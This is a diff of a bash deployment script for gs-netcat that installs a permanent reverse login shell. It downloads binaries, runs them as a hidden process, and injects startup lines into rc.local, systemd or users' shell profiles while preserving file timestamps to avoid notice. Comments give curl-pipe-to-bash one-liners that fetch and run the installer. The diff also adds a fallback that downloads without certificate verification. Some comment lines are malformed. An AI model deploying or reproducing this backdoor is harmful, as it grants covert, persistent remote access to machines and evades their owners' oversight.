@@ -1,34 +1,42 @@
 #! /usr/bin/env bash
 
-# Install and start a permanent gs-netcat remote login shell
+# Install and start a permanent gs-netcat reverse login shell
+#
+# See https://www.gsocket.io/deploy/ for examples.
 #
 # This script is typically invoked like this as root or non-root user:
 #   $ bash -c "$(curl -fsSL gsocket.io/x)"
 #
+# Connect
+#   $ S=MySecret bash -c "$(curl -fsSL goscket.io/x)""
 # Pre-set a secret:
 #   $ X=MySecret bash -c "$(curl -fsSL gsocket.io/x)"
 # Uninstall
-#   $ GS_UNDO=1 bash -c "$(curl -fsSL gsocket.io/x)"
-# Access
-#   $ S=MySecret bash -c "$(curl -fsSL gsocket.io/x)"
-#
-#
-# This can be used when:
-# - gs-netcat is _not_ installed
-# - quick way to retain access to any shell (root and non-root)
-#
-# E.g. This command installs and starts a reverse shell:
-# $ bash -c "$(curl -fsSL gsocket.io/x)"
+#   $ GS_UNDO=1 bash -c" $(curl -fsSL gsocket.io/x)"
 #
 # Steps taken:
 # 1. Download pre-compiled binary
 # 2. Create a new secret (random)
-# 3. Start gs-netcat as interactive remote login shell
-# 4. Install gs-netcat to start automatically after reboot
+# 3. Start gs-netcat as a interactive reverse login shell and hidden process
+# 4. Install gs-netcat and automatically start after reboot
+#
+# Other variables:
+# GS_DEBUG=1
+# 		- Use binaries from ../packaging/gsnc-deploy-bin/
+#		- Verbose output
+#		- Shorter timeout to restart crontab etc
+#       - Also sets GS_USELOCAL=1
+# GS_USELOCAL=1
+#       - Use local binaries (do not download)
+# GS_NOINST=1
+#		- Do not install backdoor
+# GS_PREFIX=path
+#		- Use 'path' instead of '/' (needed for packaging/testing)
 
 # Global Defines
 URL_BASE="https://github.com/hackerschoice/binary/raw/main/gsocket/bin/"
 URL_DEPLOY="gsocket.io/x"
+GS_VERSION=1.4.32
 DL_CRL="bash -c \"\$(curl -fsSL $URL_DEPLOY)\""
 DL_WGT="bash -c \"\$(wget -qO- $URL_DEPLOY)\""
 # DL_CMD="$DL_CRL"
@@ -101,22 +109,36 @@ init_dstbin()
 	errexit "FAILED. Can not find writeable directory."
 }
 
+try_tmpdir()
+{
+	[[ -n $TMPDIR ]] && return # already set
+
+	[[ ! -d "$1" ]] && mkdir -p "$1" 2>/dev/null
+
+	[[ -d "$1" ]] && mkdir -p "${1}/${2}" 2>/dev/null && TMPDIR="${1}/${2}"
+}
+
 init_vars()
 {
 	# Select binary
 	local arch
 	arch=$(uname -m)
 	if [[ $OSTYPE == *linux* ]]; then 
-		if [[ x"$arch" == "xi686" ]] || [[ x"$arch" == "xi386" ]]; then
+		if [[ "$arch" == "i686" ]] || [[ "$arch" == "i386" ]]; then
 			OSARCH="i386-alpine"
-		elif [[ x"$arch" == "xarmv6l" ]] || [[ x"$arch" == "xarmv7l" ]]; then
+		elif [[ "$arch" == "armv6l" ]] || [[ "$arch" == "armv7l" ]]; then
 			OSARCH="armv6l-linux" # RPI-Zero / RPI 4b+
-		elif [[ x"$arch" == "xaarch64" ]]; then
+		elif [[ "$arch" == "aarch64" ]]; then
 			OSARCH="aarch64-linux"
+		elif [[ "$arch" == "mips64" ]]; then
+			OSARCH="mips64-alpine"
+		elif [[ "$arch" == *mips* ]]; then
+			OSARCH="mips32-alpine"
 		fi
 	elif [[ $OSTYPE == *darwin* ]]; then
-		if [[ x"$arch" == "xarm64" ]]; then
-			OSARCH="arm64-osx" # M1
+		if [[ "$arch" == "arm64" ]]; then
+			OSARCH="x86_64-osx" # M1
+			# OSARCH="arm64-osx" # M1
 		else
 			OSARCH="x86_64-osx"
 		fi
@@ -130,11 +152,9 @@ init_vars()
 
 	[[ -z "$OSARCH" ]] && OSARCH="x86_64-alpine" # Default: Try Alpine(muscl libc) 64bit
 
-	if [[ -d /dev/shm ]]; then
-		TMPDIR="/dev/shm/.gs-${UID}"
-	elif [[ -d /tmp ]]; then
-		TMPDIR="/tmp/.gs-${UID}"
-	fi
+	try_tmpdir "/dev/shm" ".gs-${UID}"
+	try_tmpdir "/tmp" ".gs-${UID}"
+	try_tmpdir "${HOME}/.tmp" ".gs-${UID}"
 
 	SRC_PKG="gs-netcat_${OSARCH}.tar.gz"
 
@@ -183,6 +203,7 @@ init_vars()
 
 	DEBUGF "SRC_PKG=$SRC_PKG"
 
+	[[ -n $GS_DEBUG ]] && GS_USELOCAL=1
 }
 
 init_setup()
@@ -193,10 +214,10 @@ init_setup()
 		mkdir -p "${GS_PREFIX}/usr/bin" 2>/dev/null
 		mkdir -p "${GS_PREFIX}${HOME}" 2>/dev/null
 		if [[ -f "${HOME}/${RC_FILENAME}" ]]; then
-			cp "${HOME}/${RC_FILENAME}" "${RC_FILE}"
+			cp -p "${HOME}/${RC_FILENAME}" "${RC_FILE}"
 			touch -r "${HOME}/${RC_FILENAME}" "${RC_FILE}"
 		fi
-		cp /etc/rc.local "${GS_PREFIX}/etc/"
+		cp -p /etc/rc.local "${GS_PREFIX}/etc/"
 		touch -r /etc/rc.local "${GS_PREFIX}/etc/rc.local"
 	fi
 
@@ -260,11 +281,13 @@ uninstall_rc()
 
 	grep "${BIN_HIDDEN_NAME}" "$1" &>/dev/null || return # not installed
 
-	grep -v "${BIN_HIDDEN_NAME}" "$1" >"${1}-new" 2>/dev/null
-	[[ ! -f "${1}-new" ]] && return # permission denied
+	touch -r "${1}" "${1}-ts"
+	[[ ! -f "${1}-ts" ]] && return # permission denied
+	D="$(grep -v "${BIN_HIDDEN_NAME}" "$1")"
+	echo "$D" >"${1}"
+	touch -r "${1}-ts" "${1}"
+	rm -f "${1}-ts"
 
-	touch -r "$1" "${1}-new"
-	mv "${1}-new" "$1"
 	[[ ! -s "${1}" ]] && rm -f "${1}" 2>/dev/null # delete zero size file
 }
 
@@ -403,6 +426,25 @@ WantedBy=multi-user.target" >"${SERVICE_FILE}"
 	IS_INSTALLED=1
 }
 
+# inject a string ($2-) into the 2nd line of a file and retain the
+# PERM/TIMESTAMP of the target file ($1)
+install_to_file()
+{
+	local fname="$1"
+
+	shift 1
+
+	touch -r "${fname}" "${fname}-ts" || return
+
+	D="$(IFS=$'\n'; head -n1 "${fname}" && \
+		echo "${*}" && \
+		tail -n +2 "${fname}")"
+	echo "$D" >"${fname}"
+
+	touch -r "${fname}-ts" "${fname}"
+	rm -f "${fname}-ts"
+}
+
 install_system_rclocal()
 {
 	[[ ! -f "${RCLOCAL_FILE}" ]] && return
@@ -416,14 +458,8 @@ install_system_rclocal()
 
 	# /etc/rc.local is /bin/sh which does not support the build-in 'exec' command.
 	# Thus we need to start /bin/bash -c in a sub-shell before 'exec gs-netcat'.
-	(head -n1 "${RCLOCAL_FILE}" && \
-	echo "$NOTE_DONOTREMOVE" && \
-	echo "$RCLOCAL_LINE" && \
-	tail -n +2 "${RCLOCAL_FILE}") >"${RCLOCAL_FILE}-new" 2>/dev/null || return # not writeable
 
-	# restore file's timestamp
-	touch -r "${RCLOCAL_FILE}" "${RCLOCAL_FILE}-new"
-	mv "${RCLOCAL_FILE}-new" "${RCLOCAL_FILE}"
+	install_to_file "${RCLOCAL_FILE}" "$NOTE_DONOTREMOVE" "$RCLOCAL_LINE"
 
 	gs_secret_write "$RCLOCAL_SEC_FILE"
 
@@ -482,12 +518,7 @@ install_user_profile()
 		return
 	fi
 
-	(echo "$NOTE_DONOTREMOVE" && \
-	echo "${PROFILE_LINE}" && \
-	cat "${RC_FILE}") >"${RC_FILE}-new"
-
-	touch -r "${RC_FILE}" "${RC_FILE}-new"
-	mv "${RC_FILE}-new" "${RC_FILE}"
+	install_to_file "${RC_FILE}" "$NOTE_DONOTREMOVE" "${PROFILE_LINE}"
 
 	IS_INSTALLED=1
 	OK_OUT
@@ -506,15 +537,54 @@ install_user()
 	[[ -z "$IS_SKIPPED" ]] && gs_secret_write "$USER_SEC_FILE" # Create new secret file
 }
 
+ask_nocertcheck()
+{
+	WARN "Can not verify host. CA Bundle is not installed."
+	echo "--> Attempting without certificate verification."
+	echo "--> Press any key to continue or CTRL-C to abort..."
+	echo -en 1>&2 -en "--> Continuing in "
+	local n
+
+	n=10
+	while :; do
+		echo -en 1>&2 "${n}.."
+		n=$((n-1))
+		[[ $n -eq 0 ]] && break 
+		read -r -t1 -n1 && break
+	done
+	[[ $n -gt 0 ]] || echo 1>&2 "0"
+
+	GS_NOCERTCHECK=1
+}
+
+# Use SSL and if this fails try non-ssl (if user consents to insecure downloads)
+# <nocert-param> <ssl-match> <cmd> <param-url> <url> <param-dst> <dst> 
+dl_ssl()
+{
+	if [[ -z $GS_NOCERTCHECK ]]; then
+		DL_LOG=$("$3" "$4" "$5" "$6" "$7" 2>&1)
+		[[ "${DL_LOG}" != *"$2"* ]] && return
+	fi
+
+	if [[ -z $GS_NOCERTCHECK ]]; then
+		SKIP_OUT
+		ask_nocertcheck
+	fi
+	[[ -z $GS_NOCERTCHECK ]] && return
+
+	echo -en 2>&1 "Downloading binaries without certificate verification................."
+	DL_LOG=$("$3" "$1" "$4" "$5" "$6" "$7" 2>&1)
+}
+
 # Download $1 and save it to $2
 dl()
 {
 	[[ -s "$2" ]] && return
 
-	local dl_log
-
 	# Need to set DL_CMD before GS_DEBUG check for proper error output
-	if command -v curl >/dev/null; then
+	if [[ -n "$GS_USELOCAL" ]]; then
+		DL_CMD="./deploy-all.sh"
+	elif command -v curl >/dev/null; then
 		DL_CMD="$DL_CRL"
 	elif command -v wget >/dev/null; then
 		DL_CMD="$DL_WGT"
@@ -525,17 +595,18 @@ dl()
 	fi
 
 	# Debugging / testing. Use local package if available
-	if [[ -n "$GS_DEBUG" ]]; then
+	if [[ -n "$GS_USELOCAL" ]]; then
 		[[ -f "../packaging/gsnc-deploy-bin/${1}" ]] && cp "../packaging/gsnc-deploy-bin/${1}" "${2}" 2>/dev/null && return
 		[[ -f "/gsocket-pkg/${1}" ]] && cp "/gsocket-pkg/${1}" "${2}" 2>/dev/null && return
-		FAIL_OUT "GS_DEBUG set but deployment binaries not found (${1})..."
+		[[ -f "${1}" ]] && cp "${1}" "${2}" 2>/dev/null && return
+		FAIL_OUT "GS_USELOCAL set but deployment binaries not found (${1})..."
 		errexit
 	fi
 
 	if [[ "$DL_CMD" == "$DL_CRL" ]]; then
-		dl_log=$(curl -fL "${URL_BASE}/${1}" --output "${2}" 2>&1)
+		dl_ssl "-k" "certificate problem" "curl" "-fL" "${URL_BASE}/${1}" "--output" "${2}"
 	elif [[ "$DL_CMD" == "$DL_WGT" ]]; then
-		dl_log=$(wget -O "$2" "${URL_BASE}/${1}" 2>&1)
+		dl_ssl "--no-check-certificate" "is not trusted" "wget" "" "${URL_BASE}/${1}" "-O" "${2}"
 	else
 		# errexit "Need curl or wget."
 		FAIL_OUT "CAN NOT HAPPEN"
@@ -543,7 +614,7 @@ dl()
 	fi
 
 	# [[ ! -s "$2" ]] && { errexit "Could not download package."; } 
-	[[ ! -s "$2" ]] && { FAIL_OUT; echo "$dl_log"; exit_code 255; } 
+	[[ ! -s "$2" ]] && { FAIL_OUT; echo "$DL_LOG"; exit_code 255; } 
 }
 
 # S= was set. Do not install but execute in place.
@@ -555,9 +626,42 @@ gs_access()
 
 	"${DSTBIN}" -s "${GS_SECRET}" -i
 	ret=$?
-	[[ $ret -eq 139 ]] && { EXECFAIL_OUT "$?" "SIGSEGV"; errexit; }
+	[[ $ret -eq 139 ]] && { WARN_EXECFAIL_SET "$?" "SIGSEGV"; WARN_EXECFAIL; errexit; }
+	[[ $ret -eq 61 ]] && {
+		echo -e 2>&1 "--> ${CR}Could not connect to the remote host. It is not installed.${CN}"
+		echo -e 2>&1 "--> ${CR}To install use one of the following:${CN}"
+		echo -e 2>&1 "--> ${CM}X=\"${GS_SECRET}\" ${DL_CRL}${CN}"
+		echo -e 2>&1 "--> ${CM}X=\"${GS_SECRET}\" ${DL_WGT}${CN}"
+	}
 
 	exit_code "$ret"
+}
+
+gs_update()
+{
+	echo -en 2>&1 "Checking existing binaries............................................"
+
+	command -v gs-netcat >/dev/null || { FAIL_OUT "gs-netcat not found."; exit 255; }
+	OK_OUT
+
+	local gsnc_bin
+	gsnc_bin="$(command -v gs-netcat)"
+
+	echo -en 2>&1 "Backup old binaries..................................................."
+	err_log=$(mv -f "${gsnc_bin}" "${gsnc_bin}-old" 2>&1) || { FAIL_OUT "$err_log"; exit 255; }
+	OK_OUT
+
+	echo -en 2>&1 "Updating binaries....................................................."
+
+	err_log=$(mv -f "${DSTBIN}" "${gsnc_bin}" 2>&1) || { FAIL_OUT "$err_log"; exit 255; }
+	OK_OUT
+
+	echo -en 2>&1 "Testing updated binaries.............................................."
+	ver_new="$(gs-netcat -h 2>&1 | grep GS)"
+	[[ "$ver_new" =~ $GS_VERSION ]] || { FAIL_OUT "Wrong version: $ver_new"; exit 255; }
+
+	OK_OUT "Updated to $ver_new"
+	exit 0
 }
 
 # Binary is in an executeable directory (no noexec-flag)
@@ -579,6 +683,10 @@ test_bin()
 
 	[[ -z "$ERR_LOG" ]] && ERR_LOG="$err_log"
 	[[ $ret -eq 139 ]] && { FAIL_OUT; ERR_LOG=""; WARN_EXECFAIL_SET "$?" "SIGSEGV"; return; }
+	# 126 - Exec format error
+	# 255 && "connect(" match => Cannot connect to backend
+	[[ $ret -eq 255 ]] && [[ $err_log =~ connect\( ]] && { FAIL_OUT; errexit "Cannot connect to GSRN. Firewalled?"; }
+
 	# Fail unless it's ECONNREFUSED
 	[[ $ret -ne 61 ]] && { FAIL_OUT; WARN_EXECFAIL_SET 0 "default pkg failed"; return; }
 
@@ -605,8 +713,8 @@ try()
 	OK_OUT
 
 	echo -en 2>&1 "Unpacking binaries...................................................."
-	# Unpack
-	(cd "${TMPDIR}" && tar xfz "${src_pkg}") || { FAIL_OUT "unpacking failed"; errexit; }
+	# Unpack (suppress "tar: warning: skipping header 'x'" on alpine linux
+	(cd "${TMPDIR}" && tar xfz "${src_pkg}" 2>/dev/null) || { FAIL_OUT "unpacking failed"; errexit; }
 	[[ -f "${TMPDIR}/._gs-netcat" ]] && rm -f "${TMPDIR}/._gs-netcat" # from docker???
 	OK_OUT
 
@@ -632,7 +740,7 @@ try_any()
 {
 	targets="x86_64-alpine i386-alpine x86_64-debian aarch64-linux armv6l-linux x86_64-cygwin x86_64-freebsd x86_64-osx"
 	for osarch in $targets; do
-		[[ x"$osarch" = x"$OSARCH" ]] && continue # Skip the default OSARCH (already tried)
+		[[ "$osarch" = "$OSARCH" ]] && continue # Skip the default OSARCH (already tried)
 		try "$osarch"
 		[[ -n "$IS_TESTBIN_OK" ]] && break
 	done
@@ -658,6 +766,8 @@ init_setup
 try "$OSARCH" 1
 [[ -z "$IS_TESTBIN_OK" ]] && try_any
 
+[[ -n "$GS_UPDATE" ]] && gs_update
+
 # S= is set. Do not install but connect to remote using S= as secret.
 [[ -n "$S" ]] && gs_access
 
@@ -666,17 +776,19 @@ try "$OSARCH" 1
 
 # -----BEGIN Install permanentally-----
 # Try to install system wide. This may also start the service.
-[[ $UID -eq 0 ]] && install_system
+[[ -z $GS_NOINST ]] && [[ $UID -eq 0 ]] && install_system
 
 # Try to install to user's login script or crontab
-[[ -z "$IS_INSTALLED" ]] && install_user
+[[ -z $GS_NOINST ]] && [[ -z "$IS_INSTALLED" ]] && install_user
+
+[[ -n $GS_NOINST ]] && echo -e 2>&1 "GS_NOINST is set. Skipping installation."
 # -----END Install permanentally-----
 
 if [[ -z "$IS_INSTALLED" ]]; then
 	echo -e 1>&1 "--> ${CR}Access will be lost after reboot.${CN}"
 fi
 # After all install attempts output help how to uninstall
-echo -e 1>&2 "--> To uninstall type ${CM}GS_UNDO=1 ${DL_CMD}${CN}"
+echo -e 1>&2 "--> To uninstall use ${CM}GS_UNDO=1 ${DL_CMD}${CN}"
 
 printf 1>&2 "%-70.70s" "Starting '${BIN_HIDDEN_NAME}' as hidden process '${PROC_HIDDEN_NAME}'....................................."
 if [[ -n "$IS_SYSTEMD" ]]; then
@@ -732,7 +844,7 @@ elif [[ -z "$IS_GS_RUNNING" ]]; then
 	fi
 fi
 
-echo -e 1>&2 "--> To connect type one of the following:
+echo -e 1>&2 "--> To connect use one of the following:
 --> ${CM}gs-netcat -s \"${GS_SECRET}\" -i${CN}
 --> ${CM}S=\"${GS_SECRET}\" ${DL_CRL}${CN}
 --> ${CM}S=\"${GS_SECRET}\" ${DL_WGT}${CN}"
